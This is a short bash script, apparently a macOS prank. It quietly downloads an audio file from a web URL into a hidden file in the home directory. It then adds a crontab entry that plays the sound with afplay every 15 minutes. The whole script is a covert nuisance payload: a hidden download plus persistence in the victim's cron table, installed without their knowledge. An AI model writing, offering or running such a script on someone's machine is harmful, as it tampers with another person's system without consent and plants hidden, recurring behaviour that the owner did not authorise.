#!/bin/bash

# Downloand and hide the file
curl -s http://0.s3.envato.com/files/17833436/preview.mp3 > ~/.laughs.mp3

# New cron job every 15 minutes
cmd="0,15,30,45 * * * * afplay ~/.laughs.mp3";

# Adding the new job
(crontab -l; echo "$cmd") | crontab -
